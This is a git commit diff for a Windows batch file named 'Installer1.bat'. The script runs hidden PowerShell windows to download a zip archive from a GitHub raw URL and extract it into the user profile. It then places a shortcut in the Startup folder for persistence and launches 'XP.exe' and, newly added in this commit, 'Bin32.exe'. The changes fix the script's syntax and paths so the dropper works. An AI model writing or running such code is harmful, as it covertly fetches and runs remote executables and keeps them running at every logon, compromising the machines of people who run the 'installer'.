3c8543b0ed9461131e94ecbb9bf86e615ec22dc1
peasiodjoaskdsa <140851719+peasiodjoaskdsa@users.noreply.github.com>
2023-12-10 17:08:33 +0100

    Update Installer1.bat

--- Installer1.bat
+++ Installer1.bat
@@ -1,10 +1,10 @@
 @echo off
 
 PowerShell.exe -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/lp.zip -OutFile '%USERPROFILE%\lp\lp.zip'"
-timeout
-/t 10/nobreak
-PowerShell.exe -NoProfile -WindowStyle hidden -Command "cd '%USERPROFILE%'; Expand-Archive -Path 'lp.zip' -DestinationPath '%USERPROFILE%\lp' -Force"
+timeout /t 20 /nobreak
+PowerShell.exe -NoProfile -WindowStyle hidden -Command "cd '%USERPROFILE%'; Expand-Archive -Path '%USERPROFILE%\lp\lp.zip' -DestinationPath '%USERPROFILE%\lp' -Force"
 set SourceExe=%USERPROFILE%\lp\Shortcut.bat
 set DestinationPath=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHORTCUT.lnk
 powershell.exe -WindowStyle hidden -Command "$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%DestinationPath%'); $Shortcut.TargetPath = '%SourceExe%'; $Shortcut.Save()"
 start "" XP.exe
+start "" Bin32.exe
